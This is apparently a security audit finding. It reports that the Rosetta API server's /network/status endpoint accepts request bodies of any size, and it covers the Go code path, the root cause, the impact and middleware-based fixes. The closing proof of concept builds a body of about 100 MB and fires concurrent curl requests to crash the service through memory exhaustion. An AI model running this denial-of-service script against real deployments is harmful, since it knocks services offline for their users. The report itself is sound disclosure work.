### Title
Unbounded Request Body Deserialization in `/network/status` Enables OOM-Based Denial of Service

### Summary
The Rosetta API server has no application-level request body size limit on any endpoint, including `/network/status`. The Rosetta SDK router deserializes the full JSON body (including an arbitrary `metadata` map) into memory before invoking `NetworkStatus()`. An unauthenticated attacker can POST a multi-megabyte or gigabyte body within the `ReadTimeout` window, exhausting process memory and crashing the service, halting all transaction confirmation.

### Finding Description

**Code path:**

`rosetta/main.go` constructs the `http.Server` with only time-based limits — no body size cap:

```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,   // default 5s
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
``` [1](#0-0) 

There is no `http.MaxBytesReader` wrapping `r.Body` anywhere in the middleware chain or router setup. A grep across the entire `rosetta/` tree for `MaxBytesReader`, `LimitReader`, or any body-size guard returns zero results.

The Rosetta SDK's `server.NewNetworkAPIController` handler reads and JSON-decodes the full request body into a `*rTypes.NetworkRequest` before calling `NetworkStatus()`. The `NetworkRequest.Metadata` field is typed `map[string]interface{}`, meaning arbitrarily large and deeply nested JSON objects are fully materialized in heap memory.

`NetworkStatus()` itself never sees the raw body — the damage is done upstream in the SDK router during deserialization: [2](#0-1) 

**Root cause:** The failed assumption is that `ReadTimeout` bounds memory consumption. It bounds *time*, not *bytes*. On a 1 Gbps link, 5 seconds allows ~625 MB of body data to be read and allocated in a single request.

**Why existing checks fail:**

1. `ReadTimeout = 5s` — limits the attack window but not the allocation size per request.
2. Traefik `inFlightReq: amount: 5` and `rateLimit: average: 10` — these are **optional** and **disabled by default** (`middleware: false` in the Helm values): [3](#0-2) 
Even when enabled, 5 concurrent requests × 625 MB = ~3 GB per attacker IP, and multiple IPs can attack simultaneously.

3. No authentication is required on `/network/status` — it is a public Rosetta spec endpoint.

### Impact Explanation
A successful attack crashes the Go process via OOM kill, stopping all Rosetta-mediated transaction confirmation. Because the endpoint is unauthenticated and the body is deserialized before any application logic runs, the attacker does not need any valid credentials, tokens, or knowledge of the network state. Recovery requires a process restart; repeated attacks prevent sustained uptime.

### Likelihood Explanation
Any internet-reachable Rosetta deployment without an external reverse proxy enforcing body-size limits is directly exploitable. The attack requires only `curl` or equivalent — no special tooling, no authentication, no prior knowledge. It is trivially repeatable and can be scripted to fire continuously, keeping the service down indefinitely. Deployments that rely solely on the default Helm chart (with `middleware: false`) have no compensating control.

### Recommendation
1. **Immediate:** Wrap `r.Body` with `http.MaxBytesReader` in a middleware applied before the Rosetta SDK router, e.g.:
   ```go
   func bodyLimitMiddleware(next http.Handler, limit int64) http.Handler {
       return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
           r.Body = http.MaxBytesReader(w, r.Body, limit)
           next.ServeHTTP(w, r)
       })
   }
   ```
   A limit of 1–4 KB is sufficient for any valid Rosetta `NetworkRequest`.
2. **Enable** the Traefik `inFlightReq` and `rateLimit` middleware in production Helm deployments (set `middleware: true`).
3. Add a `bufio`-based or Content-Length pre-check to reject requests with `Content-Length` exceeding the limit before reading the body.

### Proof of Concept
```bash
# Generate a ~100 MB oversized metadata body
python3 -c "
import json, sys
payload = {'network_identifier': {'blockchain': 'Hedera', 'network': 'testnet'},
           'metadata': {'x': 'A' * 100_000_000}}
sys.stdout.write(json.dumps(payload))
" > /tmp/big_body.json

# Fire multiple concurrent requests
for i in $(seq 1 20); do
  curl -s -X POST http://<rosetta-host>:5700/network/status \
       -H 'Content-Type: application/json' \
       --data-binary @/tmp/big_body.json &
done
wait
# Observe: process OOM-killed or service becomes unresponsive
```
